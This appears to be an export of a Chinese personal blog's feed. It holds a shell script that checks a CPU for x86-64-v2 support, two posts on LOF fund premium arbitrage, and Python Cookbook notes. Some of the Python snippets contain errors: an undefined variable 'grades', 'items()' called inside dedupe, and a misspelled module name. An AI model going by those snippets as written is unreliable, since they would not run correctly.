    <url>/2023/1213193745.html</url>
    <content><![CDATA[<h2><span id="问题描述">问题描述</span></h2><p>RHEL 9要求x86_64的CPU支持x86-64-v2，x86-64-v2需要处理器支持 CMPXCHG16B、LAHF-SAHF、POPCNT、SSE3、SSE4.1、SSE4.2、SSSE3 等现代指令集</p>
<h2><span id="检查cpu是否支持x86-64-v2的方法">检查CPU是否支持x86-64-v2的方法</span></h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">flags=$(<span class="built_in">cat</span> /proc/cpuinfo | grep flags | <span class="built_in">head</span> -n 1 | <span class="built_in">cut</span> -d: -f2)</span><br><span class="line">supports_v2=<span class="string">&#x27;awk &quot;/cx16/&amp;&amp;/lahf/&amp;&amp;/popcnt/&amp;&amp;/sse4_1/&amp;&amp;/sse4_2/&amp;&amp;/ssse3/ &#123;found=1&#125; END &#123;exit !found&#125;&quot;&#x27;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$flags</span>&quot;</span> | <span class="built_in">eval</span> <span class="variable">$supports_v2</span></span><br><span class="line"><span class="keyword">if</span> [ $? -eq 0 ]; <span class="keyword">then</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="string">&quot;CPU supports x86-64-v2&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="string">&quot;CPU doesn&#x27;t support x86-64-v2&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
<span id="more"></span>
<h2><span id="参考">参考</span></h2><p>【1】<a href="https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/9/html/9.0_release_notes/architectures">https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux&#x2F;9&#x2F;html&#x2F;9.0_release_notes&#x2F;architectures</a><br>【2】<a href="https://unix.stackexchange.com/questions/631217/how-do-i-check-if-my-cpu-supports-x86-64-v2">https://unix.stackexchange.com/questions/631217/how-do-i-check-if-my-cpu-supports-x86-64-v2</a></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>印度基金低风险套利回顾</title>
    <url>/2024/0217194406.html</url>
    <content><![CDATA[<p>2024年1月19日当天，印度基金(164824)开放申购，限额申购100元，当天溢价率13%左右，这个溢价率已经非常可观了，当然要祭出一拖七大法搞它一把！</p>
<span id="more"></span>

<p><img data-src="/2024/0217194406/image1.png"></p>
<h2><span id="一拖七套利原理简介">一拖七套利原理简介</span></h2><p>详细的原理和方法可自行在雪球搜索，这里只做简单表述：</p>
<ul>
<li>印度基金(164824)是一个LOF基金，既可以在场内申赎，也可以在场内买卖</li>
<li>当LOF基金的价格高于净值时，可以通过先申购再卖出的方式进行溢价套利</li>
<li>印度基金T日在场内申购,  T+2日晚到账, T+3日可卖出；场外申购转托管在T+5日可卖出</li>
<li>对于深市的印度基金，可以用3个深市股东账户+3个深市封闭基金账户+1个TA账户进行申购，这样单身份证可以申购700元，这就是一拖七</li>
<li>必须有场内一折申购+免5的券商渠道，否则交易成本高达6%</li>
</ul>
<h2><span id="操作记录">操作记录</span></h2><p>从1月19日(周五)开始每天使用一拖七大法申购, 从1月24日开始每天早盘卖出，场外转托管, 直到2月8日(节前最后一个交易日)结束，每个身份证获利708元：<br><img data-src="/2024/0217194406/image2.png"><br>如果下次遇到同样的机会，就继续薅羊毛吧 ~</p>
]]></content>
      <categories>
        <category>investment</category>
      </categories>
      <tags>
        <tag>investment</tag>
      </tags>
  </entry>
  <entry>
    <title>全球芯片LOF大幅溢价，痛失巨肉我拍断大腿！</title>
    <url>/2024/0310224202.html</url>
    <content><![CDATA[<p>3月8号当天，全球芯片LOF(501225)出现15%的大幅溢价。这只基每个身份证限额申购1万，这意味着如果你在3月5号申购，在3月8号收盘前卖出，一户收益高达1500元，3天收益率15%，简直是抢钱！在如此恐怖的收益率面前，高利贷都只能算个弟弟！</p>
<span id="more"></span>

<p><img data-src="/2024/0310224202/image1.png"></p>
<p>然而，我3月5号并没有申购，或者说完全没注意到这只鸡的存在，因为集思录里刚好没有收录这个基金，只能说获取信息的路子不够多啊。3月6号(周三)，我后知后觉，每户小额申购1千。</p>
<p><img data-src="/2024/0310224202/image2.jpg"></p>
<p>没有拉满到1万的原因是，我当时认为周三6个点的溢价不算太高，场内成交额不大，基金跟踪的费城半导体指数波动较大。结果没想到周四周五这货被连续爆炒，溢价冲上了惊人的15%！？？</p>
<p>算了下这波没拉满起码少赚了几千块，看到别人几个账户一天怒赚1万+，我真是拍断大腿，只能留下羡慕和悔恨的泪水~</p>
<p>打不过就加入！周五我继续小额参与了一把。15个点的溢价，承受两天的波动，风险在于英伟达的下跌带动基金净值下跌，以及下周三场内接盘侠不足导致溢价被抹平。</p>
<p><img data-src="/2024/0310224202/image3.webp"></p>
<p>吃肉还是吃面，下周三见分晓。</p>
<p>为什么穷？因为我对钱不够热爱啊！</p>
]]></content>
      <categories>
        <category>investment</category>
      </categories>
      <tags>
        <tag>investment</tag>
      </tags>
  </entry>
  <entry>
    <title>Python cookbook 笔记</title>
    <url>/2023/1216193917.html</url>
    <content><![CDATA[<h2><span id="一-数据结构和算法">一、数据结构和算法</span></h2><h3><span id="1-解压序列赋值给多个变量">1. 解压序列赋值给多个变量</span></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>year, month, day = [<span class="number">2002</span>, <span class="number">6</span>, <span class="number">10</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(year, month, day)</span><br><span class="line"><span class="number">2002</span> <span class="number">6</span> <span class="number">10</span></span><br></pre></td></tr></table></figure>

<p>可以用占位符，丢弃其他的值</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">year, _ , _ = [<span class="number">2002</span>,<span class="number">6</span>,<span class="number">10</span>]</span><br><span class="line"><span class="built_in">print</span>(year)</span><br><span class="line"><span class="number">2002</span></span><br></pre></td></tr></table></figure>
<span id="more"></span>

<h3><span id="2-解压可迭代对象赋值给多个变量">2. 解压可迭代对象赋值给多个变量</span></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">L = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line">first, *middle, last = grades</span><br><span class="line"><span class="built_in">print</span>(middle)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]</span><br></pre></td></tr></table></figure>

<h3><span id="3-保留最后n个元素">3. 保留最后N个元素</span></h3><p>使用deque，指定maxlen参数的值为AN</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> collections <span class="keyword">import</span> deque</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dq = deque(maxlen=<span class="number">3</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dq.append(<span class="number">1</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dq.append(<span class="number">2</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dq.append(<span class="number">3</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dq.append(<span class="number">4</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dq.append(<span class="number">5</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(dq)</span><br><span class="line">deque([<span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>], maxlen=<span class="number">3</span>)</span><br></pre></td></tr></table></figure>

<h3><span id="4-查找最大或最小的n个元素">4. 查找最大或最小的N个元素</span></h3><p>利用heaq模块的nlargest()和nsmallest()方法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>nums = [<span class="number">3</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">1</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>smallest = heapq.nsmallest(<span class="number">3</span>, nums)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(smallest)</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>largest = heapq.nlargest(<span class="number">3</span>, nums)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(largest)</span><br><span class="line">[<span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>]</span><br></pre></td></tr></table></figure>

<h3><span id="x205-字典中的键如何映射多个值">&#x20;5. 字典中的键如何映射多个值</span></h3><p>可以将多个值放到列表或集合里。 使用defaultdict自动初始化每个key，只需关注添加元素操作，如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> collections <span class="keyword">import</span> defaultdict</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d = defaultdict(<span class="built_in">list</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d[<span class="string">&#x27;a&#x27;</span>].append(<span class="number">1</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(d)</span><br><span class="line">defaultdict(&lt;<span class="keyword">class</span> <span class="string">&#x27;list&#x27;</span>&gt;, &#123;<span class="string">&#x27;a&#x27;</span>: [<span class="number">1</span>]&#125;)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d = defaultdict(<span class="built_in">set</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d[<span class="string">&#x27;a&#x27;</span>].add(<span class="number">1</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(d)</span><br><span class="line">defaultdict(&lt;<span class="keyword">class</span> <span class="string">&#x27;set&#x27;</span>&gt;, &#123;<span class="string">&#x27;a&#x27;</span>: &#123;<span class="number">1</span>&#125;&#125;)</span><br></pre></td></tr></table></figure>

<h3><span id="8-在数据字典中执行计算操作比如求最小值最大值排序等">8. 在数据字典中执行计算操作（比如求最小值，最大值，排序等）</span></h3><p>考虑下面的股票名和价格</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">prices = &#123;</span><br><span class="line">	<span class="string">&#x27;ACME&#x27;</span>: <span class="number">45.23</span>,</span><br><span class="line">	<span class="string">&#x27;AAPL&#x27;</span>: <span class="number">612.78</span>,</span><br><span class="line">	<span class="string">&#x27;IBM&#x27;</span>: <span class="number">205.55</span>,</span><br><span class="line">	<span class="string">&#x27;HPQ&#x27;</span>: <span class="number">37.20</span>,</span><br><span class="line">	<span class="string">&#x27;FB&#x27;</span>: <span class="number">10.75</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>比如查找最小和最大股票价格和股票名称</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">min_price = <span class="built_in">min</span>(<span class="built_in">zip</span>(prices.values(), prices.keys()))</span><br><span class="line"><span class="comment"># (10.75, &#x27;FB&#x27;)</span></span><br><span class="line">max_price = <span class="built_in">max</span>(<span class="built_in">zip</span>(prices.values(), prices.keys()))</span><br><span class="line"><span class="comment"># (612.78, &#x27;AAPL&#x27;)</span></span><br></pre></td></tr></table></figure>

<p>使用zip和sorted函数排列字典数据</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">prices_sorted = <span class="built_in">sorted</span>(<span class="built_in">zip</span>(prices.values(), prices.keys()))</span><br></pre></td></tr></table></figure>

<h3><span id="9-寻找两个字典的相同点">9. 寻找两个字典的相同点</span></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = &#123;<span class="string">&#x27;x&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;y&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;z&#x27;</span>: <span class="number">3</span>&#125;</span><br><span class="line">b = &#123;<span class="string">&#x27;w&#x27;</span>: <span class="number">10</span>, <span class="string">&#x27;x&#x27;</span>: <span class="number">11</span>, <span class="string">&#x27;y&#x27;</span>: <span class="number">2</span>&#125;</span><br><span class="line"></span><br><span class="line">a.keys() &amp; b.keys() <span class="comment"># &#123;&#x27;x&#x27;, &#x27;y&#x27;&#125;</span></span><br><span class="line">a.items() &amp; b.items() <span class="comment"># &#123; (&#x27;y&#x27;, 2) &#125;</span></span><br></pre></td></tr></table></figure>

<h3><span id="以现有字典构造一个排除几个指定键的字典">以现有字典构造一个排除几个指定键的字典</span></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">c = &#123;key: a[key] <span class="keyword">for</span> key <span class="keyword">in</span> a.keys() - &#123;<span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;w&#x27;</span>&#125;&#125;</span><br><span class="line"><span class="comment"># c is &#123;&#x27;x&#x27;: 1, &#x27;y&#x27;: 2&#125;</span></span><br></pre></td></tr></table></figure>

<h3><span id="10删除序列相同元素并保持顺序">10.删除序列相同元素并保持顺序</span></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">dedupe</span>(<span class="params">items</span>):</span><br><span class="line">	seen = <span class="built_in">set</span>()</span><br><span class="line">	<span class="keyword">for</span> item <span class="keyword">in</span> items():</span><br><span class="line">		<span class="keyword">if</span> item <span class="keyword">not</span> <span class="keyword">in</span> seen:</span><br><span class="line">			<span class="keyword">yield</span> item</span><br><span class="line">			seen.add(item)</span><br></pre></td></tr></table></figure>

<h3><span id="11-给切片命名是代码清晰可读">11. 给切片命名，是代码清晰可读</span></h3><p>利用slice函数，消除代码中的硬编码，使代码清晰可读</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>ip=<span class="string">&quot;&lt;127.0.0.1&gt;&quot;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>GET_IP = <span class="built_in">slice</span>(<span class="number">1</span>,-<span class="number">1</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ip[GET_IP]</span><br><span class="line"><span class="string">&#x27;127.0.0.1&#x27;</span></span><br></pre></td></tr></table></figure>

<h3><span id="12-找出序列中出现次数最多的元素">12. 找出序列中出现次数最多的元素</span></h3><p>使用collections.Counter类</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">words = [<span class="string">&#x27;look&#x27;</span>, <span class="string">&#x27;into&#x27;</span>, <span class="string">&#x27;into&#x27;</span>, <span class="string">&#x27;the&#x27;</span>, <span class="string">&#x27;sky&#x27;</span>]</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter</span><br><span class="line">word_counts = Counter(words)</span><br><span class="line">top_two = word_counts.most_common(<span class="number">2</span>)</span><br><span class="line">python test.py</span><br><span class="line">[(<span class="string">&#x27;into&#x27;</span>, <span class="number">2</span>), (<span class="string">&#x27;look&#x27;</span>, <span class="number">1</span>)]</span><br></pre></td></tr></table></figure>

<h3><span id="13-通过某个关键字排序一个字典列表">13. 通过某个关键字排序一个字典列表</span></h3><p>使用operator模块的<code>itemgetter</code>函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">rows = [</span><br><span class="line">&#123;<span class="string">&#x27;fname&#x27;</span>: <span class="string">&#x27;Brian&#x27;</span>, <span class="string">&#x27;lname&#x27;</span>: <span class="string">&#x27;Jones&#x27;</span>, <span class="string">&#x27;uid&#x27;</span>: <span class="number">1003</span>&#125;,</span><br><span class="line">&#123;<span class="string">&#x27;fname&#x27;</span>: <span class="string">&#x27;David&#x27;</span>, <span class="string">&#x27;lname&#x27;</span>: <span class="string">&#x27;Beazley&#x27;</span>, <span class="string">&#x27;uid&#x27;</span>: <span class="number">1002</span>&#125;,</span><br><span class="line">&#123;<span class="string">&#x27;fname&#x27;</span>: <span class="string">&#x27;John&#x27;</span>, <span class="string">&#x27;lname&#x27;</span>: <span class="string">&#x27;Cleese&#x27;</span>, <span class="string">&#x27;uid&#x27;</span>: <span class="number">1001</span>&#125;,</span><br><span class="line">&#123;<span class="string">&#x27;fname&#x27;</span>: <span class="string">&#x27;Big&#x27;</span>, <span class="string">&#x27;lname&#x27;</span>: <span class="string">&#x27;Jones&#x27;</span>, <span class="string">&#x27;uid&#x27;</span>: <span class="number">1004</span>&#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>根据uid关键字排序</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> operator <span class="keyword">import</span> itemgetter</span><br><span class="line">rows_by_fname = <span class="built_in">sorted</span>(rows, key=itemgetter(<span class="string">&#x27;fname&#x27;</span>))</span><br><span class="line">rows_by_uid = <span class="built_in">sorted</span>(rows, key=itemgetter(<span class="string">&#x27;uid&#x27;</span>))</span><br><span class="line">[&#123;<span class="string">&#x27;fname&#x27;</span>: <span class="string">&#x27;John&#x27;</span>, <span class="string">&#x27;lname&#x27;</span>: <span class="string">&#x27;Cleese&#x27;</span>, <span class="string">&#x27;uid&#x27;</span>: <span class="number">1001</span>&#125;,</span><br><span class="line">&#123;<span class="string">&#x27;fname&#x27;</span>: <span class="string">&#x27;David&#x27;</span>, <span class="string">&#x27;lname&#x27;</span>: <span class="string">&#x27;Beazley&#x27;</span>, <span class="string">&#x27;uid&#x27;</span>: <span class="number">1002</span>&#125;,</span><br><span class="line">&#123;<span class="string">&#x27;fname&#x27;</span>: <span class="string">&#x27;Brian&#x27;</span>, <span class="string">&#x27;lname&#x27;</span>:  <span class="string">&#x27;Jones&#x27;</span>, <span class="string">&#x27;uid&#x27;</span>: <span class="number">1003</span>&#125;,</span><br><span class="line">&#123;<span class="string">&#x27;fname&#x27;</span>: <span class="string">&#x27;Big&#x27;</span>, <span class="string">&#x27;lname&#x27;</span>: <span class="string">&#x27;Jones&#x27;</span>, <span class="string">&#x27;uid&#x27;</span>: <span class="number">1004</span>&#125;]</span><br></pre></td></tr></table></figure>

<h3><span id="14-排序不支持原生比较的对象">14. 排序不支持原生比较的对象</span></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>:</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, user_id</span>):</span><br><span class="line">		<span class="variable language_">self</span>.user_id = user_id</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">__repr__</span>(<span class="params">self</span>):</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&#x27;User(&#123;&#125;)&#x27;</span>.<span class="built_in">format</span>(<span class="variable language_">self</span>.user_id)</span><br><span class="line"></span><br><span class="line">users = [User(<span class="number">23</span>),User(<span class="number">3</span>),User(<span class="number">99</span>)]</span><br><span class="line"><span class="built_in">print</span>(users)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">sorted</span>(users, key = <span class="keyword">lambda</span> u: u.user_id))</span><br><span class="line"></span><br><span class="line">[User(<span class="number">23</span>), User(<span class="number">3</span>), User(<span class="number">99</span>)]</span><br><span class="line">[User(<span class="number">3</span>), User(<span class="number">23</span>), User(<span class="number">99</span>)]</span><br></pre></td></tr></table></figure>

<h3><span id="15-通过某个字段将记录分组">15. 通过某个字段将记录分组</span></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> operator <span class="keyword">import</span> itemgetter</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> groupby</span><br><span class="line"></span><br><span class="line">rows = [</span><br><span class="line">&#123;<span class="string">&#x27;address&#x27;</span>: <span class="string">&#x27;5412 N CLARK&#x27;</span>, <span class="string">&#x27;date&#x27;</span>: <span class="string">&#x27;07/01/2012&#x27;</span>&#125;,</span><br><span class="line">&#123;<span class="string">&#x27;address&#x27;</span>: <span class="string">&#x27;5148 N CLARK&#x27;</span>, <span class="string">&#x27;date&#x27;</span>: <span class="string">&#x27;07/04/2012&#x27;</span>&#125;,</span><br><span class="line">&#123;<span class="string">&#x27;address&#x27;</span>: <span class="string">&#x27;5800 E 58TH&#x27;</span>, <span class="string">&#x27;date&#x27;</span>: <span class="string">&#x27;07/02/2012&#x27;</span>&#125;,</span><br><span class="line">&#123;<span class="string">&#x27;address&#x27;</span>: <span class="string">&#x27;2122 N CLARK&#x27;</span>, <span class="string">&#x27;date&#x27;</span>: <span class="string">&#x27;07/03/2012&#x27;</span>&#125;,</span><br><span class="line">&#123;<span class="string">&#x27;address&#x27;</span>: <span class="string">&#x27;5645 N RAVENSWOOD&#x27;</span>, <span class="string">&#x27;date&#x27;</span>: <span class="string">&#x27;07/02/2012&#x27;</span>&#125;,</span><br><span class="line">&#123;<span class="string">&#x27;address&#x27;</span>: <span class="string">&#x27;1060 W ADDISON&#x27;</span>, <span class="string">&#x27;date&#x27;</span>: <span class="string">&#x27;07/02/2012&#x27;</span>&#125;,</span><br><span class="line">&#123;<span class="string">&#x27;address&#x27;</span>: <span class="string">&#x27;4801 N BROADWAY&#x27;</span>, <span class="string">&#x27;date&#x27;</span>: <span class="string">&#x27;07/01/2012&#x27;</span>&#125;,</span><br><span class="line">&#123;<span class="string">&#x27;address&#x27;</span>: <span class="string">&#x27;1039 W GRANVILLE&#x27;</span>, <span class="string">&#x27;date&#x27;</span>: <span class="string">&#x27;07/04/2012&#x27;</span>&#125;,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">rows.sort(key=itemgetter(<span class="string">&#x27;date&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> date, items <span class="keyword">in</span> groupby(rows, key=itemgetter(<span class="string">&#x27;date&#x27;</span>)):</span><br><span class="line">    <span class="built_in">print</span>(date)</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> items:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27; &#x27;</span>, item)</span><br></pre></td></tr></table></figure>

<p>运行结果</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">07/01/<span class="number">2012</span></span><br><span class="line">  &#123;<span class="string">&#x27;address&#x27;</span>: <span class="string">&#x27;5412 N CLARK&#x27;</span>, <span class="string">&#x27;date&#x27;</span>: <span class="string">&#x27;07/01/2012&#x27;</span>&#125;</span><br><span class="line">  &#123;<span class="string">&#x27;address&#x27;</span>: <span class="string">&#x27;4801 N BROADWAY&#x27;</span>, <span class="string">&#x27;date&#x27;</span>: <span class="string">&#x27;07/01/2012&#x27;</span>&#125;</span><br><span class="line">07/02/<span class="number">2012</span></span><br><span class="line">  &#123;<span class="string">&#x27;address&#x27;</span>: <span class="string">&#x27;5800 E 58TH&#x27;</span>, <span class="string">&#x27;date&#x27;</span>: <span class="string">&#x27;07/02/2012&#x27;</span>&#125;</span><br><span class="line">  &#123;<span class="string">&#x27;address&#x27;</span>: <span class="string">&#x27;5645 N RAVENSWOOD&#x27;</span>, <span class="string">&#x27;date&#x27;</span>: <span class="string">&#x27;07/02/2012&#x27;</span>&#125;</span><br><span class="line">  &#123;<span class="string">&#x27;address&#x27;</span>: <span class="string">&#x27;1060 W ADDISON&#x27;</span>, <span class="string">&#x27;date&#x27;</span>: <span class="string">&#x27;07/02/2012&#x27;</span>&#125;</span><br><span class="line">07/03/<span class="number">2012</span></span><br><span class="line">  &#123;<span class="string">&#x27;address&#x27;</span>: <span class="string">&#x27;2122 N CLARK&#x27;</span>, <span class="string">&#x27;date&#x27;</span>: <span class="string">&#x27;07/03/2012&#x27;</span>&#125;</span><br><span class="line">07/04/<span class="number">2012</span></span><br><span class="line">  &#123;<span class="string">&#x27;address&#x27;</span>: <span class="string">&#x27;5148 N CLARK&#x27;</span>, <span class="string">&#x27;date&#x27;</span>: <span class="string">&#x27;07/04/2012&#x27;</span>&#125;</span><br><span class="line">  &#123;<span class="string">&#x27;address&#x27;</span>: <span class="string">&#x27;1039 W GRANVILLE&#x27;</span>, <span class="string">&#x27;date&#x27;</span>: <span class="string">&#x27;07/04/2012&#x27;</span>&#125;</span><br></pre></td></tr></table></figure>

<h3><span id="16-过滤序列元素">16. 过滤序列元素</span></h3><p>最简单的方法是使用列表推导，例如：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>mylist = [<span class="number">1</span>, <span class="number">4</span>, -<span class="number">5</span>, <span class="number">10</span>, -<span class="number">7</span>, <span class="number">2</span>, <span class="number">3</span>, -<span class="number">1</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[n <span class="keyword">for</span> n <span class="keyword">in</span> mylist <span class="keyword">if</span> n &gt; <span class="number">0</span>]</span><br><span class="line">[<span class="number">1</span>, <span class="number">4</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[n <span class="keyword">for</span> n <span class="keyword">in</span> mylist <span class="keyword">if</span> n &lt; <span class="number">0</span>]</span><br><span class="line">[-<span class="number">5</span>, -<span class="number">7</span>, -<span class="number">1</span>]</span><br></pre></td></tr></table></figure>

<p>如果对内存敏感，可以用生成器表达式，例如：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>pos = (n <span class="keyword">for</span> n <span class="keyword">in</span> mylist <span class="keyword">if</span> n &gt; <span class="number">0</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> x <span class="keyword">in</span> pos:</span><br><span class="line"><span class="meta">... </span><span class="built_in">print</span>(x)</span><br><span class="line">...</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="number">10</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">3</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>

<p>如果过滤规则复杂，不能简单用列表推导，可以考虑用内建的filter()函数，例如：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">values = [<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;-&#x27;</span>, <span class="string">&#x27;N/A&#x27;</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_int</span>(<span class="params">val</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        x = <span class="built_in">int</span>(val)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">ivals = <span class="built_in">list</span>(<span class="built_in">filter</span>(is_int, values))</span><br><span class="line"><span class="built_in">print</span>(ivals)</span><br></pre></td></tr></table></figure>

<p>如果你需要用另一个相关联的序列来过滤某个序列时，可以考虑itertools.compress()函数，例如：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">addresses = [</span><br><span class="line"><span class="string">&#x27;5412 N CLARK&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;5148 N CLARK&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;5800 E 58TH&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;2122 N CLARK&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;5645 N RAVENSWOOD&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;1060 W ADDISON&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;4801 N BROADWAY&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;1039 W GRANVILLE&#x27;</span>,</span><br><span class="line">]</span><br><span class="line">counts = [ <span class="number">0</span>, <span class="number">3</span>, <span class="number">10</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> compress</span><br><span class="line">more5 = [ n &gt; <span class="number">5</span> <span class="keyword">for</span> n <span class="keyword">in</span> counts]</span><br><span class="line">result = <span class="built_in">list</span>(compress(addresses, more5))</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[<span class="string">&#x27;5800 E 58TH&#x27;</span>, <span class="string">&#x27;1060 W ADDISON&#x27;</span>, <span class="string">&#x27;4801 N BROADWAY&#x27;</span>]</span><br></pre></td></tr></table></figure>

<h3><span id="从字典中提取子集">从字典中提取子集</span></h3><p>最简单的方式是使用字典推导， 例如：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">prices = &#123;</span><br><span class="line"><span class="string">&#x27;ACME&#x27;</span>: <span class="number">45.23</span>,</span><br><span class="line"><span class="string">&#x27;AAPL&#x27;</span>: <span class="number">612.78</span>,</span><br><span class="line"><span class="string">&#x27;IBM&#x27;</span>: <span class="number">205.55</span>,</span><br><span class="line"><span class="string">&#x27;HPQ&#x27;</span>: <span class="number">37.20</span>,</span><br><span class="line"><span class="string">&#x27;FB&#x27;</span>: <span class="number">10.75</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Make a dictionary of all prices over 200</span></span><br><span class="line">p1 = &#123;key: value <span class="keyword">for</span> key, value <span class="keyword">in</span> prices.items() <span class="keyword">if</span> value &gt; <span class="number">200</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>&#123;<span class="string">&#x27;AAPL&#x27;</span>: <span class="number">612.78</span>, <span class="string">&#x27;IBM&#x27;</span>: <span class="number">205.55</span>&#125;</span><br></pre></td></tr></table></figure>

